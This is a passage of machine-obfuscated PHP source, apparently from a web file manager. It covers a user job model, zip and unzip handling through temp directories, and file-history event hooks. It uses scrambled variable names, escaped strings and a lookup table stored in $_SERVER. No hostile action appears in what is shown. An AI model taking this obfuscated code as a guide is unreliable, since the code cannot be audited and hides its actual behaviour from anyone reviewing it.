$this->getAutoName($Ú•š§­Œ); if ($Ú•š§­Œ != $’‹©”Ñ¢) { return !1; } $‹õ™«ÏÄ = array($‡”ªÀì¹[1797] => USER_ID, $‡”ªÀì¹[562] => 0, $‡”ªÀì¹[32] => $©Ğş“); return $this->where($‹õ™«ÏÄ)->save(array($‡”ªÀì¹[32] => $Ú•š§­Œ)); } protected function resetSort($•ˆÓŠÊ•) { $©¾İÂîË =& $_SERVER[ÓïÕü]; $•ˆÓŠÊ• = is_array($•ˆÓŠÊ•) ? $•ˆÓŠÊ• : array(); $—©Ğ¢³ = array($©¾İÂîË[1797] => USER_ID); for ($Ù‘íÖ–ı = 0; $Ù‘íÖ–ı < count($•ˆÓŠÊ•); $Ù‘íÖ–ı++) { $—©Ğ¢³[$©¾İÂîË[496]] = $•ˆÓŠÊ•[$Ù‘íÖ–ı]; $this->where($—©Ğ¢³)->save(array($©¾İÂîË[2010] => $Ù‘íÖ–ı + 1)); } return !0; } protected function moveTop($ÈÁùŒü) { $¹Íƒ¿—“ =& $_SERVER[ÓïÕü]; $“·µäÏã = array($¹Íƒ¿—“[1797] => USER_ID, $¹Íƒ¿—“[562] => 0); $ÂŒÃèé = $this->where($“·µäÏã)->where(array($¹Íƒ¿—“[32] => $ÈÁùŒü))->find(); if (!$ÂŒÃèé) { return; } $›Ø‘é‰‰ = $this->field($¹Íƒ¿—“[478])->where($“·µäÏã)->order($¹Íƒ¿—“[2500])->select(); $›Ø‘é‰‰ = array_to_keyvalue($›Ø‘é‰‰, $¹Íƒ¿—“[12], $¹Íƒ¿—“[478]); $Øäğğø = $›Ø‘é‰‰; $›Ø‘é‰‰ = array_remove_value($›Ø‘é‰‰, $ÂŒÃèé[$¹Íƒ¿—“[478]]); array_unshift($›Ø‘é‰‰, $ÂŒÃèé[$¹Íƒ¿—“[478]]); return $this->resetSort($›Ø‘é‰‰); } protected function moveBottom($µŞ¨×‰¢) { $Œ»ıÛÃ® =& $_SERVER[ÓïÕü]; $éÆ‚µÂó = array($Œ»ıÛÃ®[1797] => USER_ID, $Œ»ıÛÃ®[562] => 0); $ØØùÔ£ = $this->where($éÆ‚µÂó)->max($Œ»ıÛÃ®[2030]); $µ°ûıêÇ = array($Œ»ıÛÃ®[2030] => $ØØùÔ£ + 1); return $this->where($éÆ‚µÂó)->where(array($Œ»ıÛÃ®[32] => $µŞ¨×‰¢))->save($µ°ûıêÇ); } private function getAutoName($Æ–Àş­) { $Ò‚Ú²ê =& $_SERVER[ÓïÕü]; $¿¯‰Å‡† = array($Ò‚Ú²ê[1797] => USER_ID, $Ò‚Ú²ê[562] => 0); $ñÒåÚâ‘ = $this->field($Ò‚Ú²ê[32])->where($¿¯‰Å‡†)->select(); $ñÒåÚâ‘ = array_to_keyvalue($ñÒåÚâ‘, $Ò‚Ú²ê[12], $Ò‚Ú²ê[32]); if (!$ñÒåÚâ‘ || !in_array($Æ–Àş­, $ñÒåÚâ‘)) { return $Æ–Àş­; } for ($¾â“ˆÍÍ = 0; $¾â“ˆÍÍ < count($ñÒåÚâ‘); $¾â“ˆÍÍ++) { if (!in_array($Æ–Àş­ . "\x28{$¾â“ˆÍÍ}\x29", $ñÒåÚâ‘)) { return $Æ–Àş­ . "\50{$¾â“ˆÍÍ}\x29"; } } return $Æ–Àş­ . "\50{$¾â“ˆÍÍ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\152\x6f\x62\114\151\163\x74"; public $field = array("\x6e\141\155\145", "\144\x65\x73\143", "\x73\x6f\x72\x74"); const JOB_KEY = "\x73\145\x6c\x66\x4a\157\x62\x4c\x69\x73\164"; public function listData($ Æè‹»è = false, $’«©™Æ¾ = "\163\157\162\164", $Àû˜ï­Â = false) { return parent::listData($ Æè‹»è, $’«©™Æ¾, $Àû˜ï­Â); } public function remove($¿ìŸ­ğÉ) { return parent::remove($¿ìŸ­ğÉ); } public function add($Öáƒ‘åä) { $ù—…”Ï =& $_SERVER[ÓïÕü]; if ($this->findByName($Öáƒ‘åä[$ù—…”Ï[32]])) { return !1; } $Öáƒ‘åä[$ù—…”Ï[2030]] = $this->getSort(); return parent::insert($Öáƒ‘åä); } private function getSort() { $ú¼ı¿éæ =& $_SERVER[ÓïÕü]; $î—°–ù = parent::listData(); $ˆóË÷èƒ = array_to_keyvalue($î—°–ù, $ú¼ı¿éæ[12], $ú¼ı¿éæ[2030]); return empty($ˆóË÷èƒ) ? 0 : max($ˆóË÷èƒ) + 1; } public function update($¦Ò¡ŒˆŒ, $Ğ€ñÃ­Ï) { $Ò¨àô‘½ =& $_SERVER[ÓïÕü]; $öæ…–× = parent::listData($¦Ò¡ŒˆŒ); $™›©‹ñÔ = $this->findByName($Ğ€ñÃ­Ï[$Ò¨àô‘½[32]]); if (!$öæ…–× || $™›©‹ñÔ && $™›©‹ñÔ[$Ò¨àô‘½[478]] != $öæ…–×[$Ò¨àô‘½[478]]) { return !1; } return parent::update($¦Ò¡ŒˆŒ, $Ğ€ñÃ­Ï); } public function setUserJob($ä÷‹¨¤¦, $³™ã¶ñ€) { $Ø‡°óÕµ =& $_SERVER[ÓïÕü]; if (!is_array($³™ã¶ñ€)) { $³™ã¶ñ€ = array($³™ã¶ñ€); } $™ó¨–åî = parent::listData(); $™æœÁÈü = array_to_keyvalue($™ó¨–åî, $Ø‡°óÕµ[32]); $œÛåÍ¦ß = $Ø‡°óÕµ[457]; foreach ($³™ã¶ñ€ as $İÏí‡œä) { if ($™æœÁÈü[$İÏí‡œä]) { $œÛåÍ¦ß .= $™æœÁÈü[$İÏí‡œä][$Ø‡°óÕµ[478]] . $Ø‡°óÕµ[50]; } else { $Ş¶¼¸ç = $this->add($İÏí‡œä); $œÛåÍ¦ß .= $Ş¶¼¸ç . $Ø‡°óÕµ[50]; } } $œÛåÍ¦ß = rtrim($œÛåÍ¦ß, $Ø‡°óÕµ[50]); Model($Ø‡°óÕµ[602])->metaSet($ä÷‹¨¤¦, self::JOB_KEY, $œÛåÍ¦ß); } public function getUserJob($‡ÈÅ²ô¹) { $ã£‰•¿© = Model($_SERVER[ÓïÕü][602])->metaGet($‡ÈÅ²ô¹); return $this->getUserJobInfo($ã£‰•¿©[self::JOB_KEY]); } public function getUserJobInfo($£Òßì©ô) { $¹ÑœòŞÊ =& $_SERVER[ÓïÕü]; $ëìÚü‡ƒ = explode($¹ÑœòŞÊ[50], $£Òßì©ô); $º»ı¯ÌÏ = parent::listData(); $º»ı¯ÌÏ = array_remove_key($º»ı¯ÌÏ, $¹ÑœòŞÊ[234]); $’Åéøâ = array(); foreach ($ëìÚü‡ƒ as $ƒË²‡û) { if (isset($º»ı¯ÌÏ[$ƒË²‡û])) { $’Åéøâ[] = $º»ı¯ÌÏ[$ƒË²‡û]; } } return $’Åéøâ; } } goto Fµ¤°¾êÈ; A×İÉ¸·Ï: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Ğõ”ìµ¤; if ($Ğõ”ìµ¤) { return $Ğõ”ìµ¤; } $ÚœòÔÇ = IO::init($_SERVER[ÓïÕü][8]); return $ÚœòÔÇ; } private static function iconvSystem($Í–ŠÉì©) { return self::local()->iconvSystem($Í–ŠÉì©); } private static function iconvApp($æ†½¸ÈÈ) { return self::local()->iconvApp($æ†½¸ÈÈ); } public static function zipFolder($åÁÛà¨, $ÚŒüØ¥Œ = "\x7a\151\x70", $”×ÜÕ¯í = '', $ŸáËÁÔÅ = REPEAT_RENAME) { $ÇŠŠİç‡ =& $_SERVER[ÓïÕü]; $ŞÕƒ“®´ = IO::listPath($åÁÛà¨); if (!$ŞÕƒ“®´) { return !1; } $ŞÕƒ“®´ = array_merge($ŞÕƒ“®´[$ÇŠŠİç‡[85]], $ŞÕƒ“®´[$ÇŠŠİç‡[86]]); return self::zip($ŞÕƒ“®´, $ÚŒüØ¥Œ, $”×ÜÕ¯í, $ŸáËÁÔÅ); } public static function zip($§Ü•„ä, $¾«ã„Ÿ¢ = "\x7a\151\160", $¯ˆñ§ªÇ = '', $ò˜Û„±· = REPEAT_RENAME) { $¯ª‡¶øâ =& $_SERVER[ÓïÕü]; if (is_string($§Ü•„ä) && $§Ü•„ä) { $§Ü•„ä = array(array($¯ª‡¶øâ[87] => $§Ü•„ä)); } $ğâ‰Ü£¼ = self::init($§Ü•„ä[0][$¯ª‡¶øâ[87]]); $¯ëÚù› = self::info($§Ü•„ä[0][$¯ª‡¶øâ[87]]); $³×ßƒÁé = $¯ª‡¶øâ[12]; $Ó„ëÒ²Ê = $¯ª‡¶øâ[12]; $â£ßÄ™Ø = $¯ª‡¶øâ[12]; if ($¯ˆñ§ªÇ && substr($¯ˆñ§ªÇ, -1, 1) != $¯ª‡¶øâ[8]) { $Ó„ëÒ²Ê = get_path_father($¯ˆñ§ªÇ); $â£ßÄ™Ø = get_path_this($¯ˆñ§ªÇ); } else { $Ó„ëÒ²Ê = self::pathFather($¯ëÚù›[$¯ª‡¶øâ[87]]); $â£ßÄ™Ø = $¯ëÚù›[$¯ª‡¶øâ[32]] . $¯ª‡¶øâ[10] . $¾«ã„Ÿ¢; if (count($§Ü•„ä) > 1) { $Ììîù… = IO::info($Ó„ëÒ²Ê); $â£ßÄ™Ø = $Ììîù…[$¯ª‡¶øâ[32]] . $¯ª‡¶øâ[10] . $¾«ã„Ÿ¢; } if ($¯ˆñ§ªÇ) { $Ó„ëÒ²Ê = $¯ˆñ§ªÇ; } } if ($ğâ‰Ü£¼->getType() == $¯ª‡¶øâ[109]) { $ß¨Ôˆı = self::init($Ó„ëÒ²Ê); $Ëö×Êá = $ß¨Ôˆı->getType() == $¯ª‡¶øâ[109] ? $Ó„ëÒ²Ê : get_path_father($ğâ‰Ü£¼->path); $Ëö×Êá = IO::getPathInner($Ëö×Êá); $Ëö×Êá = rtrim($Ëö×Êá, $¯ª‡¶øâ[8]) . $¯ª‡¶øâ[8]; mk_dir($Ëö×Êá); } else { $³×ßƒÁé = TEMP_FILES . $¯ª‡¶øâ[1293] . time() . rand_string(8) . $¯ª‡¶øâ[8]; mk_dir($³×ßƒÁé); file_put_contents($³×ßƒÁé . $¯ª‡¶øâ[1294], $¯ª‡¶øâ[12]); $Ëö×Êá = $³×ßƒÁé; } $ÔÕ‚òİı = IO::info($Ëö×Êá); if (!$ÔÕ‚òİı || !$ÔÕ‚òİı[$¯ª‡¶øâ[236]]) { show_json(LNG($¯ª‡¶øâ[1295]), !1); } $ĞÎ÷«øÎ = self::zipFileList($§Ü•„ä, $³×ßƒÁé); foreach ($ĞÎ÷«øÎ as $ï÷Ğ˜’ü => $ëìÎ¤Õä) { $ĞÎ÷«øÎ[$ï÷Ğ˜’ü] = self::iconvSystem($ëìÎ¤Õä); } $öÎñ”ã = get_filename_auto($Ëö×Êá . $â£ßÄ™Ø, $¯ª‡¶øâ[12], $ò˜Û„±·); KodArchive::create(self::iconvSystem($öÎñ”ã), $ĞÎ÷«øÎ); if (!IO::exist($öÎñ”ã)) { if ($³×ßƒÁé) { del_dir($³×ßƒÁé); } write_log($¯ª‡¶øâ[1296] . $öÎñ”ã, $¯ª‡¶øâ[391]); show_json(LNG($¯ª‡¶øâ[1297]), !1); } if (!$³×ßƒÁé) { return $öÎñ”ã; } $’™ş¶ƒø = self::move($öÎñ”ã, $Ó„ëÒ²Ê, $ò˜Û„±·); if ($³×ßƒÁé) { del_dir($³×ßƒÁé); } if (!$öÎñ”ã) { write_log($¯ª‡¶øâ[1298] . $öÎñ”ã . $¯ª‡¶øâ[1299] . $Ó„ëÒ²Ê, $¯ª‡¶øâ[391]); show_json(LNG($¯ª‡¶øâ[1297]), !1); } return $’™ş¶ƒø; } public static function unzip($ğûÂŒæ«, $Ô…¨ŞÑ†, $‹ôèµ¦ª = "\x2d\x31", $ÄüœÒ‚Î = "\162\145\x70\x6c\x61\x63\x65") { $¦†Òúâú =& $_SERVER[ÓïÕü]; $Şš–ùš‹ = parent::info($ğûÂŒæ«); if (!$Şš–ùš‹) { show_json(LNG($¦†Òúâú[1300]), !1); } $¾€ÖÂã» = IO::infoFullSimple($Ô…¨ŞÑ†); if (!$¾€ÖÂã») { $Ô…¨ŞÑ† = IO::mkdir($Ô…¨ŞÑ†); } if (isset($¾€ÖÂã»[$¦†Òúâú[194]]) && trim($¾€ÖÂã»[$¦†Òúâú[87]], $¦†Òúâú[8]) != trim($Ô…¨ŞÑ†, $¦†Òúâú[8])) { $ƒœ´Øå = KodIO::make($¾€ÖÂã»[$¦†Òúâú[193]]); $ûÌÆßä = IO::fileNameAuto($ƒœ´Øå, $¾€ÖÂã»[$¦†Òúâú[32]], REPEAT_RENAME_FOLDER, !0); $Ô…¨ŞÑ† = IO::mkdir($ƒœ´Øå . $ûÌÆßä); } $‹ôèµ¦ª = $‹ôèµ¦ª && $‹ôèµ¦ª != $¦†Òúâú[1301] ? @json_decode($‹ôèµ¦ª, !0) : -1; $‰ƒŒ‘€Ã = self::unzipPart($ğûÂŒæ«, $‹ôèµ¦ª); if (!$‰ƒŒ‘€Ã || !IO::exist($‰ƒŒ‘€Ã[$¦†Òúâú[233]])) { show_json(LNG($¦†Òúâú[108]), !1); } $¯›½şÌ· = $‰ƒŒ‘€Ã[$¦†Òúâú[1302]][count($‰ƒŒ‘€Ã[$¦†Òúâú[1302]]) - 1]; if ($¯›½şÌ·[$¦†Òúâú[1303]] == -1 || substr($¯›½şÌ·[$¦†Òúâú[32]], -1, 1) == $¦†Òúâú[8]) { $±Ôæ¢‹³ = $‰ƒŒ‘€Ã[$¦†Òúâú[1304]] . rand_string(10) . $¦†Òúâú[8]; mk_dir($±Ôæ¢‹³); $Â÷ëÎƒ× = count($‰ƒŒ‘€Ã[$¦†Òúâú[1302]]) == 1 ? IO::ext($ğûÂŒæ«) : get_path_ext($‰ƒŒ‘€Ã[$¦†Òúâú[233]]); $ıÉä´¬ = KodArchive::extract(self::iconvSystem($‰ƒŒ‘€Ã[$¦†Òúâú[233]]), $±Ôæ¢‹³, $¯›½şÌ·[$¦†Òúâú[1303]], $ûÌÆßä, $Â÷ëÎƒ×); self::unzipErrorCheck($ıÉä´¬, array($¦†Òúâú[1305], $ğûÂŒæ«, $Â÷ëÎƒ×, $Ô…¨ŞÑ†, $‰ƒŒ‘€Ã)); Hook::trigger($¦†Òúâú[1306], $±Ôæ¢‹³); recursion_dir($±Ôæ¢‹³, $ŸÀæ¥È¹, $ÔõâÊ¦¹, 0); $ÚÍ‚Ğı = array_merge($ŸÀæ¥È¹, $ÔõâÊ¦¹); $›Ó»¨Ğ = array(); foreach ($ÚÍ‚Ğı as $Ô“¹¹) { $ğÚ”„­ = IO::move(self::iconvApp($Ô“¹¹), $Ô…¨ŞÑ†, $ÄüœÒ‚Î); if ($ğÚ”„­) { $›Ó»¨Ğ[] = $ğÚ”„­; } } del_dir($±Ôæ¢‹³); } else { $ğÚ”„­ = IO::move($‰ƒŒ‘€Ã[$¦†Òúâú[233]], $Ô…¨ŞÑ†, $ÄüœÒ‚Î, get_path_this($¯›½şÌ·[$¦†Òúâú[32]])); if ($ğÚ”„­) { $›Ó»¨Ğ[] = $ğÚ”„­; } } return $›Ó»¨Ğ ? $›Ó»¨Ğ : !1; } public static function unzipList($È¤š£í©) { $Ô»‡ü =& $_SERVER[ÓïÕü]; $ûÍÉÕªß = isset($È¤š£í©[$Ô»‡ü[1307]]) ? $È¤š£í©[$Ô»‡ü[1307]] : !1; $ÀÈ­øı… = isset($È¤š£í©[$Ô»‡ü[1303]]) ? @json_decode($È¤š£í©[$Ô»‡ü[1303]], !0) : -1; $¬î€î« = self::unzipPart($È¤š£í©[$Ô»‡ü[87]], $ÀÈ­øı…); if (!$¬î€î« || !IO::exist($¬î€î«[$Ô»‡ü[233]])) { show_json(LNG($Ô»‡ü[108]), !1); } $ˆ†àŸ«œ = $¬î€î«[$Ô»‡ü[1302]][count($¬î€î«[$Ô»‡ü[1302]]) - 1]; $·ÍëÁû = in_array(IO::ext($¬î€î«[$Ô»‡ü[233]]), array($Ô»‡ü[391], $Ô»‡ü[1308], $Ô»‡ü[1309], $Ô»‡ü[1310], $Ô»‡ü[1311], $Ô»‡ü[1312])); if (!$ûÍÉÕªß && ($ˆ†àŸ«œ[$Ô»‡ü[1303]] == -1 || $·ÍëÁû)) { $„í‰˜öÕ = $¬î€î«[$Ô»‡ü[1304]] . get_path_this($¬î€î«[$Ô»‡ü[233]]) . $Ô»‡ü[1313]; if (!IO::exist($„í‰˜öÕ)) { $ğÀÄíÜù = $ˆ†àŸ«œ[$Ô»‡ü[1303]] == -1 ? get_path_ext(IO::pathThis($È¤š£í©[$Ô»‡ü[87]])) : get_path_ext($¬î€î«[$Ô»‡ü[233]]); $–ØŒÓ£½ = KodArchive::listContent(self::iconvSystem($¬î€î«[$Ô»‡ü[233]]), !0, $ğÀÄíÜù); self::unzipErrorCheck($–ØŒÓ£½, array($Ô»‡ü[1314], $È¤š£í©, $¬î€î«)); @file_put_contents($„í‰˜öÕ, json_encode($–ØŒÓ£½[$Ô»‡ü[1315]])); } return @json_decode(IO::getContent($„í‰˜öÕ), !0); } IO::fileOut($¬î€î«[$Ô»‡ü[233]], $ûÍÉÕªß, get_path_this($ˆ†àŸ«œ[$Ô»‡ü[32]])); die; } private static function zipFileList($˜ü‰¹ã, $ÜçÓ¶û = false) { $£ñ”ÙÂà =& $_SERVER[ÓïÕü]; $·ÃÛÀñ¶ = array(); foreach ($˜ü‰¹ã as $Í¬Ì×™) { $æÎ¥ıœø = $Í¬Ì×™[$£ñ”ÙÂà[87]]; if ($ÜçÓ¶û) { $æÎ¥ıœø = self::copy($Í¬Ì×™[$£ñ”ÙÂà[87]], $ÜçÓ¶û, $£ñ”ÙÂà[915]); } else { $îÎ±£¾” = self::init($Í¬Ì×™[$£ñ”ÙÂà[87]]); if ($îÎ±£¾”->getType() == $£ñ”ÙÂà[109]) { $æÎ¥ıœø = $îÎ±£¾”->path; } } if ($æÎ¥ıœø && self::local()->exist($æÎ¥ıœø)) { $·ÃÛÀñ¶[$Í¬Ì×™[$£ñ”ÙÂà[87]]] = $æÎ¥ıœø; } } if (!empty($·ÃÛÀñ¶)) { return array_values($·ÃÛÀñ¶); } show_json(LNG($£ñ”ÙÂà[1273]), !1); } private static function localFilePath($“´œÏØ) { $¼ÜÓ•¶‹ =& $_SERVER[ÓïÕü]; $œ¶•¾°ò = KodIO::parse($“´œÏØ); if ($œ¶•¾°ò[$¼ÜÓ•¶‹[33]] == KodIO::KOD_SOURCE) { $ä Š¹–• = Model($¼ÜÓ•¶‹[921])->fileInfoGet(KodIO::sourceID($“´œÏØ)); if (!$ä Š¹–•[$¼ÜÓ•¶‹[87]]) { show_json($¼ÜÓ•¶‹[1316], !1); } $“´œÏØ = $ä Š¹–•[$¼ÜÓ•¶‹[87]]; } $îØ¨–Ğ» = self::init($“´œÏØ); if ($îØ¨–Ğ»->pathParse[$¼ÜÓ•¶‹[1259]]) { $“´œÏØ = $îØ¨–Ğ»->pathParse[$¼ÜÓ•¶‹[1259]]; $îØ¨–Ğ» = self::init($“´œÏØ); } $¶”œñ¯Õ = $îØ¨–Ğ»->getType(); if ($¶”œñ¯Õ == $¼ÜÓ•¶‹[109] || $¶”œñ¯Õ == $¼ÜÓ•¶‹[1317]) { if (!$îØ¨–Ğ»->exist($îØ¨–Ğ»->path)) { show_json(LNG($¼ÜÓ•¶‹[108]), !1); } return $îØ¨–Ğ»->path; } return !1; } public static function unzipPart($Ñˆ—ÒÄ, $üÄıÅÈ» = -1) { $æµ‘ô–¬ =& $_SERVER[ÓïÕü]; $¥ÊÔÄªŞ = IO::pathThis($Ñˆ—ÒÄ); if (!$üÄıÅÈ» || $üÄıÅÈ» == -1) { $±³’¿½Ø = array(array($æµ‘ô–¬[32] => $¥ÊÔÄªŞ, $æµ‘ô–¬[1303] => -1)); $±³’¿½Ø[0][$æµ‘ô–¬[1318]] = $±³’¿½Ø[0][$æµ‘ô–¬[32]]; } else { if (is_array($üÄıÅÈ»)) { $±³’¿½Ø = $üÄıÅÈ»; $ëÆóüô® = count($±³’¿½Ø) - 1; for ($§ÒôÉŠ = 0; $§ÒôÉŠ <= $ëÆóüô®; $§ÒôÉŠ++) { $·ŒÚòÉÃ = $±³’¿½Ø[$§ÒôÉŠ]; $¸—€è’Ç = get_path_this($·ŒÚòÉÃ[$æµ‘ô–¬[32]]) . (checkExtSafe($·ŒÚòÉÃ[$æµ‘ô–¬[32]]) ? $æµ‘ô–¬[12] : $æµ‘ô–¬[1319]); $±³’¿½Ø[$§ÒôÉŠ][$æµ‘ô–¬[1318]] = $æµ‘ô–¬[1320] . intval($·ŒÚòÉÃ[$æµ‘ô–¬[1303]]) . $æµ‘ô–¬[465] . $¸—€è’Ç; if ($§ÒôÉŠ == 0) { continue; } $±³’¿½Ø[$§ÒôÉŠ][$æµ‘ô–¬[1318]] = $±³’¿½Ø[$§ÒôÉŠ - 1][$æµ‘ô–¬[1318]] . $æµ‘ô–¬[1321] . $±³’¿½Ø[$§ÒôÉŠ][$æµ‘ô–¬[1318]]; } } } if (!is_array($±³’¿½Ø) || count($±³’¿½Ø) == 0) { return !1; } $à­÷í® = $±³’¿½Ø[count($±³’¿½Ø) - 1]; if (!IO::exist($Ñˆ—ÒÄ)) { return !1; } $¾²òÙ”‰ = TEMP_FILES . $æµ‘ô–¬[1322] . kodIO::hashPathSafe($Ñˆ—ÒÄ) . $æµ‘ô–¬[8]; $¨Ûµ©È‰ = $¾²òÙ”‰ . $à­÷í®[$æµ‘ô–¬[1318]]; mk_dir($¾²òÙ”‰); file_put_contents(TEMP_FILES . $æµ‘ô–¬[1294], $æµ‘ô–¬[12]); if (IO::exist($¨Ûµ©È‰)) { return array($æµ‘ô–¬[233] => $¨Ûµ©È‰, $æµ‘ô–¬[1302] => $±³’¿½Ø, $æµ‘ô–¬[1304] => $¾²òÙ”‰); } $‚¿Ã°¼‹ = self::localFilePath($Ñˆ—ÒÄ); if (!$‚¿Ã°¼‹) { $‚¿Ã°¼‹ = $¾²òÙ”‰ . $æµ‘ô–¬[1323]; if (!IO::exist($‚¿Ã°¼‹)) { self::copy($Ñˆ—ÒÄ, $¾²òÙ”‰, !1, get_path_this($‚¿Ã°¼‹)); } } if (!$‚¿Ã°¼‹ || !IO::exist($‚¿Ã°¼‹)) { return !1; } if ($à­÷í®[$æµ‘ô–¬[1303]] == -1) { return array($æµ‘ô–¬[233] => $‚¿Ã°¼‹, $æµ‘ô–¬[1302] => $±³’¿½Ø, $æµ‘ô–¬[1304] => $¾²òÙ”‰); } $¯·‹ÃÅ = $‚¿Ã°¼‹; foreach ($±³’¿½Ø as $§ÒôÉŠ => $·ŒÚòÉÃ) { if (!$·ŒÚòÉÃ || $·ŒÚòÉÃ[$æµ‘ô–¬[1303]] == $æµ‘ô–¬[1301]) { break; } if (substr($·ŒÚòÉÃ[$æµ‘ô–¬[32]], -1, 1) == $æµ‘ô–¬[8]) { break; } $ñõÖñØ = in_array(get_path_ext($·ŒÚòÉÃ[$æµ‘ô–¬[1318]]), array($æµ‘ô–¬[391], $æµ‘ô–¬[1308], $æµ‘ô–¬[1309], $æµ‘ô–¬[1310], $æµ‘ô–¬[1311], $æµ‘ô–¬[1312])); $Ûãªã‰‡ = $§ÒôÉŠ == count($±³’¿½Ø) - 1 && $ñõÖñØ; $ş°ú©Ö— = $¾²òÙ”‰ . $·ŒÚòÉÃ[$æµ‘ô–¬[1318]]; $”ôŒ›À = $¾²òÙ”‰ . get_path_this($·ŒÚòÉÃ[$æµ‘ô–¬[32]]); if (IO::exist($ş°ú©Ö—)) { $¯·‹ÃÅ = $ş°ú©Ö—; continue; } $ÑâÙ—ÂÚ = $§ÒôÉŠ == 0 ? get_path_ext($¥ÊÔÄªŞ) : get_path_ext($¯·‹ÃÅ); $êØ§ıê = KodArchive::extract(self::iconvSystem($¯·‹ÃÅ), $¾²òÙ”‰, $·ŒÚòÉÃ[$æµ‘ô–¬[1303]], $â©¤†¹ˆ, $ÑâÙ—ÂÚ); self::unzipErrorCheck($êØ§ıê, array($æµ‘ô–¬[1324], $Ñˆ—ÒÄ, $±³’¿½Ø, $·ŒÚòÉÃ, $ş°ú©Ö—)); if (IO::exist($”ôŒ›À)) { IO::rename($”ôŒ›À, get_path_this($ş°ú©Ö—)); } $¯·‹ÃÅ = $ş°ú©Ö—; } $¨Ûµ©È‰ = $¯·‹ÃÅ; return array($æµ‘ô–¬[233] => $¯·‹ÃÅ, $æµ‘ô–¬[1302] => $±³’¿½Ø, $æµ‘ô–¬[1304] => $¾²òÙ”‰); } private static function unzipErrorCheck($ñÃ‘•ÉŸ, $ğ¬³ô©ù = false) { $”„Ì‡À³ =& $_SERVER[ÓïÕü]; if ($ñÃ‘•ÉŸ[$”„Ì‡À³[1325]]) { return !0; } write_log(array($”„Ì‡À³[1326], $ñÃ‘•ÉŸ, $ğ¬³ô©ù), $”„Ì‡À³[1327]); $±ìÅÄêÚ = is_array($ñÃ‘•ÉŸ[$”„Ì‡À³[1315]]) ? json_encode($ñÃ‘•ÉŸ[$”„Ì‡À³[1315]]) : $ñÃ‘•ÉŸ[$”„Ì‡À³[1315]]; show_json($”„Ì‡À³[1328] . $±ìÅÄêÚ, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $»ø¶™Œ =& $_SERVER[ÓïÕü]; $·ó…¡Ãú = $GLOBALS[$»ø¶™Œ[6]][$»ø¶™Œ[92]]; if ($·ó…¡Ãú[$»ø¶™Œ[1329]] != 1) { return; } if ($·ó…¡Ãú[$»ø¶™Œ[1330]] <= 0) { return; } if (isset($_REQUEST[$»ø¶™Œ[1331]]) && $_REQUEST[$»ø¶™Œ[1331]] == $»ø¶™Œ[91]) { return; } Hook::bind($»ø¶™Œ[1332], $»ø¶™Œ[1333]); Hook::bind($»ø¶™Œ[1334], $»ø¶™Œ[1335]); Hook::bind($»ø¶™Œ[1336], $»ø¶™Œ[1337]); Hook::bind($»ø¶™Œ[1338], $»ø¶™Œ[1339]); Hook::bind($»ø¶™Œ[1340], $»ø¶™Œ[1341]); Hook::bind($»ø¶™Œ[1342], $»ø¶™Œ[1343]); } public static function eventBeforeUpload($»®È–”·) { if ($»®È–”·[3] && $»®È–”·[3] != REPEAT_REPLACE) { return; } $õàö˜¬‹ = self::parsePath($»®È–”·[0]); if (!$õàö˜¬‹) { return; } self::add($õàö˜¬‹); } public static function eventBeforeEdit($…œªá®Ç) { $™øùóÅ = self::parsePath($…œªá®Ç[0]); if (!$™øùóÅ) { return; } self::add($™øùóÅ); } public static function eventBeforeCopyFile($Ü…º°¼Î, $ìŠÄôŠ¨, $•®ª¹ŞÈ, $úóëãû¯, $é½ÚšÍì, $™ë±Š£´) { $•»ÛÍä =& $_SERVER[ÓïÕü]; if (isset($•®ª¹ŞÈ->_data[$•»ÛÍä[1263]]) && $•®ª¹ŞÈ->_data[$•»ÛÍä[1263]]) { return; } $éÒ™ÅÎØ = $•®ª¹ŞÈ->getPathOuter($úóëãû¯); $„ÙÔØÅ = self::parsePath($éÒ™ÅÎØ); if (!$„ÙÔØÅ) { return; } self::add($„ÙÔØÅ); } public static function eventBeforeRename($º·¶£¨) { $äµ…÷ì =& $_SERVER[ÓïÕü]; $·’Œ“ÒÔ = self::parsePath($º·¶£¨[0]); if (!$·’Œ“ÒÔ) { return; } $ªºú¡ïû = self::checkInHistory($·’Œ“ÒÔ); if (!$ªºú¡ïû) { return; } if ($ªºú¡ïû[$äµ…÷ì[33]] == $äµ…÷ì[233]) { $î¢¤¶™ = self::listData($·’Œ“ÒÔ); if ($î¢¤¶™ && $î¢¤¶™[$äµ…÷ì[448]]) { self::moveHistory($·’Œ“ÒÔ, $º·¶£¨[1]); } } else { IO::rename($ªºú¡ïû[$äµ…÷ì[87]], $º·¶£¨[1]); } } public static function eventBeforeMove($„œ¬Şæú) { $†ãÂ³­ =& $_SERVER[ÓïÕü]; $ôé„ŸÉ¼ = self::parsePath($„œ¬Şæú[0]); if (!$ôé„ŸÉ¼) { return; } $¨‡ì£Ä = self::parsePath($„œ¬Şæú[1]); if (!$¨‡ì£Ä) { return; } $¿³›˜ÏÎ = $„œ¬Şæú[3]; $÷ğñ‚†Ş = self::checkInHistory($ôé„ŸÉ¼); if (!$÷ğñ‚†Ş) { return; } $·‹Äõ½œ = self::pathHistory($¨‡ì£Ä); if ($÷ğñ‚†Ş[$†ãÂ³­[33]] == $†ãÂ³­[233]) { $éñ·¼Ë° = self::listData($ôé„ŸÉ¼); $×¯³ı·ï = rtrim($¨‡ì£Ä, $†ãÂ³­[8]) . $†ãÂ³­[8] . ($¿³›˜ÏÎ ? $¿³›˜ÏÎ : get_path_this($ôé„ŸÉ¼)); $ áóÈÂ½ = self::listData($×¯³ı·ï); if ($éñ·¼Ë° && $éñ·¼Ë°[$†ãÂ³­[448]] && $ áóÈÂ½ && $ áóÈÂ½[$†ãÂ³­[448]]) { return self::clear($ôé„ŸÉ¼); } if ($éñ·¼Ë° && $éñ·¼Ë°[$†ãÂ³­[448]]) { self::moveHistory($ôé„ŸÉ¼, $¿³›˜ÏÎ, $·‹Äõ½œ); } } else { IO::move($÷ğñ‚†Ş[$†ãÂ³­[87]], $·‹Äõ½œ, !1, $¿³›˜ÏÎ); self::clearEmptyFolder(IO::pathFather($÷ğñ‚†Ş[$†ãÂ³­[87]])); } } public static function eventAfterRemove($ÖŠ–‡ßš, $ÖâÏá) { $ğÚÏ¼Ù  =& $_SERVER[ÓïÕü]; if (!$ÖâÏá) { return; } $¸Ë¸éºË = self::parsePath($ÖŠ–‡ßš[0]); if (!$¸Ë¸éºË) { return; } $½âÕÅÁ = self::checkInHistory($¸Ë¸éºË); if (!$½âÕÅÁ) 